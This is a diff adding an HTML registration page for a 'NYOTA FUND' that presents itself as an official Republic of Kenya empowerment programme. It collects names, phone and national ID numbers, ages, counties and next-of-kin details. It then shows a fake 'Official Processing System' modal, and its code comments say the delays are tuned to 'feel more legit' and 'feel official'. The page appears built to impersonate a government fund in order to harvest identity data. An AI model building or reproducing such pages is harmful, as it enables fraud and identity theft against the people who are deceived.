@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Register - NYOTA FUND</title>
+  <link rel="stylesheet" href="style.css">
+  <!-- Firebase removed; using localStorage instead -->
+  <style>
+    /* Scoped styles only — prefixed with nyota- to avoid affecting existing UI */
+    .nyota-field{position:relative;}
+    .nyota-status{position:absolute;right:10px;top:50%;transform:translateY(-50%);width:22px;height:22px;pointer-events:none;display:flex;align-items:center;justify-content:center}
+    .nyota-status svg{width:18px;height:18px;display:block}
+    .nyota-status.n-success svg{fill:#1aa260}
+    .nyota-status.n-error svg{fill:#d64545}
+    .nyota-error{color:#d64545;font-size:12px;margin-top:6px;display:none}
+    .nyota-error.show{display:block}
+    /* Minimal modal styling (scoped) */
+    #nyotaProcessing{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.45);z-index:9999;opacity:0;pointer-events:none;transition:opacity .18s}
+    #nyotaProcessing.n-show{opacity:1;pointer-events:auto}
+    #nyotaProcessing .nyota-card{width:92%;max-width:420px;background:#fff;border-left:6px solid #0b4f7a;border-radius:8px;padding:18px;box-shadow:0 10px 30px rgba(0,0,0,0.12);text-align:center}
+    .nyota-seal{display:inline-block;width:44px;height:44px;border-radius:6px;background:linear-gradient(180deg,#0b4f7a,#0a3f63);color:#fff;font-weight:700;line-height:44px;margin-right:10px}
+    .nyota-spinner{width:44px;height:44px;border-radius:50%;border:4px solid #eef3f8;border-top-color:#0b4f7a;margin:10px auto;animation:nyota-spin 1.2s linear infinite}
+    @keyframes nyota-spin{to{transform:rotate(360deg)}}
+    .nyota-progress{height:8px;background:#eef3f8;border-radius:6px;overflow:hidden;margin-top:12px}
+    .nyota-progress > i{display:block;height:100%;width:0;background:linear-gradient(90deg,#0b4f7a,#07648d);transition:width .25s linear}
+    /* keep inputs full width as original */
+    input.nyota-input, select.nyota-input {width:100%;box-sizing:border-box}
+    /* heading above referral */
+    .nyota-ref-heading{font-weight:700;margin-bottom:6px;font-size:14px;color:#0b3b57}
+    /* small responsiveness */
+    @media (max-width:480px){ .nyota-field .nyota-status{right:8px} }
+  </style>
+</head>
+<body>
+<div class="container">
+  <h2>𝐊𝐢𝐧𝐝𝐥𝐲 𝐬𝐮𝐛𝐦𝐢𝐭 𝐭𝐡𝐞 𝐟𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 𝐫𝐞𝐪𝐮𝐢𝐫𝐞𝐦𝐞𝐧𝐭𝐬</h2>
+  <form id="registerForm" novalidate>
+    <!-- Keep placeholders and ids same as original for compatibility -->
+    <div class="nyota-field">
+      <input type="text" placeholder="Full Name" id="fullname" required class="nyota-input">
+      <span class="nyota-status" aria-hidden></span>
+      <div id="err-fullname" class="nyota-error"></div>
+    </div>
+
+    <div style="display:flex;gap:8px;">
+      <div style="flex:1" class="nyota-field">
+        <input type="text" placeholder="Phone Number" id="phone" required class="nyota-input">
+        <span class="nyota-status" aria-hidden></span>
+        <div id="err-phone" class="nyota-error"></div>
+      </div>
+
+      <div style="flex:1" class="nyota-field">
+        <input type="text" placeholder="ID Number" id="idnumber" required class="nyota-input">
+        <span class="nyota-status" aria-hidden></span>
+        <div id="err-idnumber" class="nyota-error"></div>
+      </div>
+    </div>
+
+    <div style="display:flex;gap:8px;margin-top:8px;">
+      <div style="flex:1" class="nyota-field">
+        <input type="number" placeholder="Age" id="age" required class="nyota-input">
+        <span class="nyota-status" aria-hidden></span>
+        <div id="err-age" class="nyota-error"></div>
+      </div>
+
+      <div style="flex:1" class="nyota-field">
+        <input type="text" placeholder="Occupation/Job" id="job" required class="nyota-input">
+        <span class="nyota-status" aria-hidden></span>
+        <div id="err-job" class="nyota-error"></div>
+      </div>
+    </div>
+
+    <div style="display:flex;gap:8px;margin-top:8px;">
+      <div style="flex:1" class="nyota-field">
+        <input type="text" placeholder="County" id="county" required class="nyota-input">
+        <span class="nyota-status" aria-hidden></span>
+        <div id="err-county" class="nyota-error"></div>
+      </div>
+
+      <div style="flex:1" class="nyota-field">
+        <input type="email" placeholder="Email (optional)" id="email" class="nyota-input">
+        <span class="nyota-status" aria-hidden></span>
+        <div id="err-email" class="nyota-error"></div>
+      </div>
+    </div>
+
+    <!-- Two more detail options (kept optional) -->
+    <div style="display:flex;gap:8px;margin-top:8px;">
+      <div style="flex:1" class="nyota-field">
+        <input type="text" placeholder="Next of Kin (Name) - optional" id="nokName" class="nyota-input">
+        <span class="nyota-status" aria-hidden></span>
+        <div id="err-nokName" class="nyota-error"></div>
+      </div>
+
+      <div style="flex:1" class="nyota-field">
+        <input type="text" placeholder="Next of Kin Phone - optional" id="nokPhone" class="nyota-input">
+        <span class="nyota-status" aria-hidden></span>
+        <div id="err-nokPhone" class="nyota-error"></div>
+      </div>
+    </div>
+
+    <!-- Where did you hear about NYOTA Project? heading (strong text) and dropdown — first option is Hon president William Ruto -->
+    <div style="margin-top:10px;" class="nyota-field">
+      <div class="nyota-ref-heading"><strong>Where did you hear about NYOTA Project?</strong></div>
+      <select id="referral" class="nyota-input" aria-label="Where did you hear about NYOTA Project?">
+        <option>Hon president William Ruto</option>
+        <option>Facebook</option>
+        <option>Twitter</option>
+        <option>Friend / Relative</option>
+        <option>Radio</option>
+        <option>TV</option>
+        <option>Other</option>
+      </select>
+      <div id="other-container" style="margin-top:8px;display:none">
+        <input type="text" id="otherReferral" placeholder="Please specify" class="nyota-input">
+        <div id="err-other" class="nyota-error"></div>
+      </div>
+    </div>
+
+    <button id="submitBtn" type="submit">Submit</button>
+  </form>
+
+  <p>🇰🇪 NYOTA FUND KENYA 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 🇰🇪</p>
+</div>
+
+ <!-- Processing modal (official feel) -->
+<div id="nyotaProcessing" role="dialog" aria-modal="true" aria-hidden="true">
+  <div class="nyota-card">
+    <div style="display:flex;align-items:center;justify-content:center;gap:12px;">
+      
+      <img
+        src="images.jpeg"
+        alt="Republic of Kenya — Nyota Fund official seal"
+        class="nyota-seal"
+      />
+
+      <div style="text-align:left;">
+        <div style="font-weight:700;color:#0b3b57;">
+          REPUBLIC OF KENYA — NYOTA FUND
+        </div>
+        <div style="font-size:12px;color:#6b7280;">
+          Official Processing System
+        </div>
+      </div>
+
+    <div class="nyota-spinner" aria-hidden></div>
+    <div style="font-weight:700;margin-top:6px">Processing empowerment application...</div>
+    <div class="nyota-progress" aria-hidden><i id="nyotaProgressBar"></i></div>
+    <div style="font-size:13px;color:#6b7280;margin-top:10px">Please wait while we validate your information for empowerment disbursement.</div>
+  </div>
+</div>
+
+<script>
+  (function(){
+    // Utilities
+    const $ = id => document.getElementById(id);
+    const setIcon = (fieldEl, ok) => {
+      const status = fieldEl.parentElement.querySelector('.nyota-status');
+      const err = fieldEl.parentElement.querySelector('.nyota-error');
+      if(ok){
+        status.classList.remove('n-error'); status.classList.add('n-success');
+        status.innerHTML = '<svg viewBox="0 0 24 24" aria-hidden><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4z"/></svg>';
+        if(err){ err.classList.remove('show'); err.textContent=''; }
+      } else {
+        status.classList.remove('n-success'); status.classList.add('n-error');
+        status.innerHTML = '<svg viewBox="0 0 24 24" aria-hidden><path d="M11.001 10h2v5h-2z"/><path d="M11 16h2v2h-2z"/><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg>';
+      }
+    };
+
+    const setError = (fieldEl, message) => {
+      const err = fieldEl.parentElement.querySelector('.nyota-error');
+      if(message){
+        err.textContent = message;
+        err.classList.add('show');
+      } else {
+        err.textContent = '';
+        err.classList.remove('show');
+      }
+    };
+
+    // Validation functions (Kenyan rules)
+    const validators = {
+      fullname: v => {
+        if(!v || v.trim().length < 3) return 'Please enter full name (min 3 characters).';
+        if(!/^[\p{L}\s'.-]+$/u.test(v)) return 'Name should contain letters only.';
+        return '';
+      },
+      phone: v => {
+        if(!v) return 'Phone is required.';
+        if(!/^07\d{8}$/.test(v)) return 'Kenyan phone must be 07XXXXXXXX (10 digits).';
+        return '';
+      },
+      idnumber: v => {
+        if(!v) return 'ID number required.';
+        if(!/^\d{6,12}$/.test(v)) return 'ID must be numeric (6-12 digits).';
+        return '';
+      },
+      age: v => {
+        if(v === '' || v === null) return 'Age is required.';
+        const n = Number(v);
+        if(Number.isNaN(n) || n < 18) return 'You must be at least 18.';
+        if(n > 120) return 'Enter a valid age.';
+        return '';
+      },
+      job: v => {
+        if(!v || v.trim().length < 2) return 'Please enter your occupation.';
+        return '';
+      },
+      county: v => {
+        if(!v || v.trim().length < 2) return 'Please enter your county.';
+        return '';
+      },
+      email: v => {
+        if(!v) return '';
+        if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)) return 'Please enter a valid email.';
+        return '';
+      },
+      nokName: v => {
+        if(!v) return '';
+        if(v.trim().length < 2) return 'Provide real name or leave empty.';
+        return '';
+      },
+      nokPhone: v => {
+        if(!v) return '';
+        if(!/^07\d{8}$/.test(v)) return 'Next of kin phone must be 07XXXXXXXX.';
+        return '';
+      },
+      otherReferral: v => {
+        if(!v) return 'Please specify.';
+        if(v.trim().length < 2) return 'Please specify a valid source.';
+        return '';
+      }
+    };
+
+    // Field list to wire up
+    const fields = ['fullname','phone','idnumber','age','job','county','email','nokName','nokPhone'];
+
+    // Live validation
+    fields.forEach(id => {
+      const el = $(id);
+      if(!el) return;
+      const run = () => {
+        const msg = validators[id](el.value.trim());
+        setError(el, msg);
+        setIcon(el, msg === '');
+        updateSubmitState();
+      };
+      el.addEventListener('input', run);
+      el.addEventListener('blur', run);
+    });
+
+    // referral handling
+    const referral = $('referral');
+    const otherContainer = $('other-container');
+    const otherReferral = $('otherReferral');
+    if(referral){
+      referral.addEventListener('change', () => {
+        if(referral.value === 'Other'){
+          otherContainer.style.display = 'block';
+        } else {
+          otherContainer.style.display = 'none';
+          if(otherReferral) otherReferral.value = '';
+          if(otherReferral){ setError(otherReferral, ''); setIcon(otherReferral, true); }
+        }
+      });
+    }
+
+    // ensure otherReferral is wired if present
+    if(otherReferral){
+      otherReferral.addEventListener('input', () => {
+        const msg = validators.otherReferral(otherReferral.value.trim());
+        setError(otherReferral, msg);
+        setIcon(otherReferral, msg === '');
+        updateSubmitState();
+      });
+    }
+
+    // submit button enabling
+    const submitBtn = $('submitBtn');
+    function updateSubmitState(){
+      // required: fullname, phone, idnumber, age, job, county
+      const required = ['fullname','phone','idnumber','age','job','county'];
+      let ok = true;
+      required.forEach(id => {
+        const el = $(id);
+        if(!el) ok = false;
+        else if(validators[id](el.value.trim()) !== '') ok = false;
+      });
+      // if referral other is visible, check it
+      if(referral && referral.value === 'Other'){
+        const msg = validators.otherReferral(otherReferral ? otherReferral.value.trim() : '');
+        if(msg) ok = false;
+      }
+      submitBtn.disabled = !ok;
+    }
+
+    // localStorage saving
+    function saveToLocal(user){
+      const key = 'nyota_users';
+      let arr = [];
+      try { arr = JSON.parse(localStorage.getItem(key) || '[]'); } catch(e){ arr = []; }
+      const idx = arr.findIndex(u => u.phone === user.phone);
+      if(idx >= 0) arr[idx] = user; else arr.push(user);
+      localStorage.setItem(key, JSON.stringify(arr));
+      // set current phone
+      localStorage.setItem('userPhone', user.phone);
+    }
+
+    // processing modal (slowed down to feel more legit)
+    const modal = $('nyotaProcessing');
+    const progressBar = $('nyotaProgressBar');
+    function showProcessing(done){
+      modal.classList.add('n-show');
+      modal.setAttribute('aria-hidden','false');
+      progressBar.style.width = '0%';
+      // more gradual steps and longer intervals for a "legit" feel
+      const steps = [12, 22, 37, 52, 68, 82, 93, 100];
+      let i = 0;
+      const tick = () => {
+        if(i >= steps.length){
+          // small final pause before closing to feel official
+          setTimeout(()=>{ modal.classList.remove('n-show'); modal.setAttribute('aria-hidden','true'); done(); }, 600);
+          return;
+        }
+        progressBar.style.width = steps[i] + '%';
+        i++;
+        // longer, slightly variable delays to feel realistic
+        setTimeout(tick, 700 + Math.random() * 800); // ~0.7s - 1.5s per step
+      };
+      // initial short delay then start
+      setTimeout(tick, 450);
+    }
+
+    // final submit handler
+    const form = $('registerForm');
+    if(form){
+      form.addEventListener('submit', function(e){
+        e.preventDefault();
+        // final validation pass
+        let allOk = true;
+        fields.forEach(id => {
+          const el = $(id);
+          if(!el) return;
+          const msg = validators[id](el.value.trim());
+          setError(el, msg);
+          setIcon(el, msg === '');
+          if(msg) allOk = false;
+        });
+        if(referral && referral.value === 'Other'){
+          const msg = validators.otherReferral(otherReferral.value.trim());
+          setError(otherReferral, msg);
+          setIcon(otherReferral, msg === '');
+          if(msg) allOk = false;
+        }
+        if(!allOk){ updateSubmitState(); return; }
+
+        const user = {
+          fullname: $('fullname').value.trim(),
+          phone: $('phone').value.trim(),
+          idnumber: $('idnumber').value.trim(),
+          age: $('age').value.trim(),
+          job: $('job').value.trim(),
+          county: $('county').value.trim(),
+          email: $('email').value.trim() || '',
+          nokName: $('nokName').value.trim() || '',
+          nokPhone: $('nokPhone').value.trim() || '',
+          referral: (referral && referral.value === 'Other') ? (otherReferral.value.trim() || 'Other') : (referral ? referral.value : ''),
+          createdAt: new Date().toISOString()
+        };
+
+        try{
+          saveToLocal(user);
+        }catch(err){
+          alert('Unable to save locally: ' + (err && err.message ? err.message : err));
+          return;
+        }
+
+        // show processing modal and redirect after the slower progression
+        showProcessing(()=> {
+          window.location.href = 'purpose.html';
+        });
+      });
+    }
+
+    // initial state
+    updateSubmitState();
+  })();
+</script>
+</body>
+</html>
